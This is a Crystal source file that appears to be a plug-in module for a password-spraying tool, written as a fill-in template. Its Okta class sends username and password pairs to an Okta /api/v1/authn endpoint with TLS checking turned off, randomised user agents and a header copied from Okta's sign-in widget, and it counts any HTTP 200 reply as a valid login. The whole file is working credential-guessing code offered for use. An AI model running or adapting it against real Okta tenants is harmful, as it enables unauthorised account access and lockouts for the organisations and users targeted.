require "http/client"
require "json"


class Okta < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        puts "Spraying Okta!!!"

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Content-Type" => "application/json",
            "Accept" => "application/json",
            "Accept-Language" => "en",
            "Accept-Encoding" => "gzip, deflate",
            "X-Okta-User-Agent-Extended" => "okta-auth-js/6.5.1 okta-signin-widget-6.5.0",
            "Origin" => "https://#{url.host}"
        } 


        body = {
            "password" => "#{password}",
            "username" => "#{username}",
            "options" => {
                "warnBeforePasswordExpired" => true,
                "multiOptionalFactorEnroll" => true
            }
        }
        
        # here is the basic request 
        page = client.post("/api/v1/authn", headers: header, body: body.to_json) # client supporst all http verbs as client.verb -> client.get, client.delete..etc 

        
        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        # 
        # these are EXAMPLES of how to do checks 
        if page.status_code == 200 # if ok 
            valid = true 
        end

        # if page.body.includes? "redircting to mfa"
        #     mfa = true 
        # end

        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        return [username, password, valid, lockedout, mfa]
    end
end